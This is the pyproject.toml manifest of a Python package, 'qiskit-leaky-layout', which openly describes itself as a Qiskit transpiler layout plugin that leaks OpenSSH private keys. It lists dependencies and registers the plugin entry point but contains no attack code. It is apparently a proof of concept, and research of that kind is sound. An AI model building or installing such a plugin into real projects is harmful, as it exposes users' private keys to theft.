[project]
name = "qiskit-leaky-layout"
version = "0.1.0"
description = "A transpiler stage plugin that implements a custom layout that leaks OpenSSH private keys"
authors = [
    {name = "Iyán Méndez Veiga", email = "me@iyanmv.com"},
]
dependencies = [
    "qiskit>=1.0.0",
    "gmpy2>=2.1.5",
    "cryptography>=42.0.8",
]
requires-python = ">=3.11"
readme = "README.md"
license = {text = "MIT"}

[project.entry-points."qiskit.transpiler.layout"]
leaky_layout = "qiski_leaky_layout:LeakyLayoutPlugin"
